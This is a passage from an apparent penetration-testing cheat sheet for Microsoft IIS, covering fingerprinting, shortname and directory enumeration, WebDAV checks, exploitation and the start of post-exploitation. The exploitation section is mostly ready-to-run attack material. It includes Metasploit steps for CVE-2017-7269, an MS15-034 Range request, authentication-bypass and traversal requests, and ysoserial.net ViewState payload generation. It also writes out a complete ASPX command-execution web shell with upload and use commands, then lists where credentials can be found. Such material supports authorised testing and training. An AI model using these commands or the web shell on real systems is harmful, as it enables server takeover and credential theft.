</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="c1"># May reveal internal IPs in Location headers</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1"># OpenSSL for HTTPS fingerprinting</span>
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span>target.com:443<span class="w"> </span>-showcerts
</span></code></pre></div></p>
<p><strong>Default ports:</strong>
- HTTP: 80
- HTTPS: 443
- FTP: 21
- FTPS: 990
- SMTP: 25
- Alternative ports: 8080, 8443</p>
<p><strong>IIS-specific headers to look for:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Server: Microsoft-IIS/10.0
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>X-Powered-By: ASP.NET
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>X-AspNet-Version: 4.0.30319
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>X-AspNetMvc-Version: 5.2
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>X-FEServer: [Exchange Server name]
</span></code></pre></div></p>
<p><strong>Shodan queries:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>http.title:&quot;IIS&quot;
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Server: Microsoft-IIS
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>&quot;Microsoft-IIS/10.0&quot;
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>http.component:&quot;Microsoft IIS&quot;
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>ssl.cert.issuer.cn:&quot;example.com&quot; http.title:&quot;IIS&quot;
</span></code></pre></div></p>
</div>
<div class="admonition tip">
<p class="admonition-title">Enumeration</p>
<p><strong>IIS Tilde (~) Directory Enumeration:</strong></p>
<p>IIS on Windows generates 8.3 short filenames for compatibility. This can be exploited to discover hidden files and directories.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Manual testing</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>curl<span class="w"> </span>http://target.com/*~1*/.aspx
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c1"># Look for 404 vs other responses</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># Automated scanning with shortscan</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>shortscan<span class="w"> </span>http://target.com/
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>shortscan<span class="w"> </span>http://target.com/admin/
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># Using IIS-ShortName-Scanner</span>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>java<span class="w"> </span>-jar<span class="w"> </span>iis_shortname_scanner.jar<span class="w"> </span>http://target.com
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="c1"># Nuclei template</span>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>nuclei<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-t<span class="w"> </span>http/fuzzing/iis-shortname.yaml
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="c1"># Common patterns to test</span>
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>http://target.com/ADMINI~1/
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>http://target.com/BACKUP~1/
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>http://target.com/CONFIG~1/
</span></code></pre></div>
<p><strong>Common misconfigurations:</strong></p>
<ul>
<li>Server version disclosure in headers</li>
<li>Directory browsing enabled</li>
<li>Exposed configuration files (web.config, applicationHost.config)</li>
<li>Backup files in web root</li>
<li>Debug mode enabled (compilation debug="true")</li>
<li>Detailed error messages exposing stack traces</li>
<li>Default error pages revealing server information</li>
<li>WebDAV enabled unnecessarily</li>
<li>Insecure HTTP methods allowed (PUT, DELETE, TRACE)</li>
<li>Weak SSL/TLS configurations</li>
</ul>
<p><strong>Directory and file brute-forcing:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Gobuster with IIS-specific wordlist</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt<span class="w"> </span><span class="se">\</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">         </span>-x<span class="w"> </span>aspx,asp,config,bak
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Feroxbuster for IIS</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span><span class="se">\</span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">            </span>-x<span class="w"> </span>aspx,asp,ashx,asmx,config<span class="w"> </span>-C<span class="w"> </span><span class="m">404</span>,403
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="c1"># ffuf with ASP.NET extensions</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target.com/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span><span class="se">\</span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">     </span>-e<span class="w"> </span>.aspx,.asp,.ashx,.asmx,.config,.cs,.vb
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="c1"># Dirsearch for IIS</span>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-e<span class="w"> </span>aspx,asp,ashx,asmx,config
</span></code></pre></div></p>
<p><strong>Common files and directories to check:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Configuration files</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>/web.config
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>/Web.config
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>/WEB.CONFIG
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>/web.config.bak
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>/web.config~
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>/applicationHost.config
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># Default pages</span>
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>/default.aspx
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>/Default.aspx
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>/index.aspx
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>/iisstart.htm
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="c1"># Application files</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>/Global.asax
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>/global.asa
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>/bin/
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>/App_Data/
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>/App_Code/
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>/App_Browsers/
</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a>/App_GlobalResources/
</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>/App_LocalResources/
</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>/App_Themes/
</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a>
</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="c1"># Common admin areas</span>
</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a>/admin/
</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a>/administrator/
</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a>/manage/
</span><span id="__span-10-30"><a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a>/webadmin/
</span><span id="__span-10-31"><a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a>/siteadmin/
</span><span id="__span-10-32"><a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a>/controlpanel/
</span><span id="__span-10-33"><a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a>
</span><span id="__span-10-34"><a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a><span class="c1"># API endpoints</span>
</span><span id="__span-10-35"><a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a>/api/
</span><span id="__span-10-36"><a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a>/webservices/
</span><span id="__span-10-37"><a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a>/service.asmx
</span><span id="__span-10-38"><a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a>/wcf/
</span><span id="__span-10-39"><a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a>
</span><span id="__span-10-40"><a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a><span class="c1"># Information disclosure</span>
</span><span id="__span-10-41"><a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a>/trace.axd<span class="w"> </span><span class="o">(</span>ASP.NET<span class="w"> </span>trace<span class="w"> </span>viewer<span class="o">)</span>
</span><span id="__span-10-42"><a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a>/elmah.axd<span class="w"> </span><span class="o">(</span>Error<span class="w"> </span>logging<span class="o">)</span>
</span><span id="__span-10-43"><a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a>/glimpse.axd<span class="w"> </span><span class="o">(</span>Debugging<span class="w"> </span>tool<span class="o">)</span>
</span><span id="__span-10-44"><a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a>/hangfire<span class="w"> </span><span class="o">(</span>Background<span class="w"> </span>job<span class="w"> </span>processing<span class="o">)</span>
</span></code></pre></div></p>
<p><strong>WebDAV enumeration:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Check if WebDAV is enabled</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>OPTIONS<span class="w"> </span>http://target.com
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># Look for: DAV: 1,2 in response headers</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># Nmap WebDAV detection</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>--script<span class="w"> </span>http-webdav-scan<span class="w"> </span>target.com
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c1"># davtest for WebDAV testing</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>davtest<span class="w"> </span>-url<span class="w"> </span>http://target.com
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="c1"># cadaver for interactive WebDAV</span>
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>cadaver<span class="w"> </span>http://target.com
</span></code></pre></div></p>
<p><strong>Check for exposed debug/trace features:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># ASP.NET trace viewer (if enabled)</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>curl<span class="w"> </span>http://target.com/trace.axd
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1"># Check for debug mode</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="c1"># Look in web.config or responses for:</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="c1"># &lt;compilation debug=&quot;true&quot;&gt;</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="c1"># Test for detailed errors</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>curl<span class="w"> </span>http://target.com/nonexistent.aspx
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="c1"># Detailed errors may reveal paths, versions, stack traces</span>
</span></code></pre></div></p>
</div>
<div class="admonition tip">
<p class="admonition-title">Exploitation</p>
<p><strong>Path traversal via WebDAV authentication bypass (CVE-2009-1535, CVE-2009-1122):</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># WebDAV Unicode bypass (IIS 5.0/6.0)</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>GET<span class="w"> </span>/protected/file.txt<span class="w"> </span>HTTP/1.1
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c1"># Blocked by authentication</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c1"># Bypass with Unicode encoding</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>GET<span class="w"> </span>/protected%c0%affile.txt<span class="w"> </span>HTTP/1.1
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>GET<span class="w"> </span>/protected<span class="se">\x</span>c1<span class="se">\x</span>9cfile.txt<span class="w"> </span>HTTP/1.1
</span></code></pre></div></p>
<p><strong>IIS 6.0 WebDAV buffer overflow (CVE-2017-7269):</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Metasploit module</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>use<span class="w"> </span>exploit/windows/iis/iis_webdav_scstoragepathfromurl
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nb">set</span><span class="w"> </span>RHOST<span class="w"> </span>target.com
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">80</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>exploit
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># Manual exploitation (PROPFIND request with long If header)</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1"># This is a critical RCE vulnerability</span>
</span></code></pre></div></p>
<p><strong>HTTP.SYS remote code execution (CVE-2015-1635, MS15-034):</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Range header overflow</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Range: bytes=0-18446744073709551615&quot;</span><span class="w"> </span>http://target.com/
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Nmap detection</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>--script<span class="w"> </span>http-vuln-cve2015-1635<span class="w"> </span>target.com
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c1"># Metasploit module</span>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>use<span class="w"> </span>auxiliary/dos/http/ms15_034_ulonglongadd
</span></code></pre></div></p>
<p><strong>IIS shortname disclosure to file upload:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># 1. Use shortname enumeration to find upload directory</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>shortscan<span class="w"> </span>http://target.com/
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c1"># Discovers: UPLOAD~1 -&gt; uploads/</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="c1"># 2. Upload malicious ASPX shell</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://target.com/uploads/shell.aspx<span class="w"> </span>--data-binary<span class="w"> </span>@shell.aspx
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="c1"># 3. Access the shell</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>curl<span class="w"> </span>http://target.com/uploads/shell.aspx
</span></code></pre></div></p>
<p><strong>ASP.NET ViewState deserialization (if MAC validation disabled):</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Check for disabled ViewState MAC</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1"># In web.config: enableViewStateMac=&quot;false&quot;</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c1"># ysoserial.net for payload generation</span>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>ysoserial.exe<span class="w"> </span>-o<span class="w"> </span>base64<span class="w"> </span>-g<span class="w"> </span>TypeConfuseDelegate<span class="w"> </span><span class="se">\</span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="w">              </span>-f<span class="w"> </span>ObjectStateFormatter<span class="w"> </span><span class="se">\</span>
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="w">              </span>-c<span class="w"> </span><span class="s2">&quot;cmd.exe /c whoami&quot;</span>
</span></code></pre></div></p>
<p><strong>Exploiting unrestricted file upload:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># If .aspx uploads are allowed</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="c1"># Create simple web shell</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%Response.Write(&quot;&lt;pre&gt;&quot;);Process p = new Process();p.StartInfo.FileName = &quot;cmd.exe&quot;;p.StartInfo.Arguments = &quot;/c &quot; + Request[&quot;cmd&quot;];p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());Response.Write(&quot;&lt;/pre&gt;&quot;);%&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>shell.aspx
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="c1"># Upload and access</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>curl<span class="w"> </span>http://target.com/uploads/shell.aspx?cmd<span class="o">=</span>whoami
</span></code></pre></div></p>
<p><strong>IIS reverse proxy path traversal:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># If IIS acts as reverse proxy</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="c1"># Backend: http://internal-server/admin/</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c1"># Frontend: http://target.com/api/</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c1"># Attempt traversal</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>GET<span class="w"> </span>/api../admin/<span class="w"> </span>HTTP/1.1
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>GET<span class="w"> </span>/api/../admin/<span class="w"> </span>HTTP/1.1
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>GET<span class="w"> </span>/api/..%2fadmin/<span class="w"> </span>HTTP/1.1
</span></code></pre></div></p>
</div>
<div class="admonition tip">
<p class="admonition-title">Post-Exploitation</p>
<p><strong>Where to find credentials:</strong></p>
<ul>
<li><code>web.config</code> - Connection strings, app settings</li>
<li><code>applicationHost.config</code> - Application pool identities</li>
<li><code>machine.config</code> - Global .NET settings</li>
<li><code>*.pfx</code> / <code>*.p12</code> files - SSL certificates (can be cracked)</li>
<li><code>App_Data\</code> - Local database files</li>
<li>Windows Credential Manager (cmdkey /list)</li>
<li>IIS application pool identities in memory</li>
<li>ASP.NET machine key for ViewState decryption</li>
</ul>
<p><strong>Extract credentials from configuration:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c"># Search for connection strings</span>
